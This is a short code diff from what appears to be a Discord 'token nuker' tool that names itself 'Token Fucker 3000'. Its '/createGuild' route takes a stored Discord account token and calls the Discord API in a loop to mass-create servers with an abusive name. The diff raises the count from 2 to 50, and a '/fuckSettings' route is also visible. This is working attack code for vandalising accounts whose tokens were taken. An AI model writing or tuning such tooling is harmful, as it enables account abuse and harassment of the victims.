@@ -161,8 +161,8 @@ app.get(`${base}/fuckSettings`, async (req, res) => {
 });
 app.get(`${base}/createGuild`, async (req, res) => {
     const token = localStorage.getItem("token").toString();
-    const guildCount = 2;
-    
+    const guildCount = 50;
+
     for (let i = 0; i < guildCount; i++) {
         await DiscordAPI.createGuild(token, "Get Fucked By Token Fucker 3000!", "2TffvPucqHkN");
     }
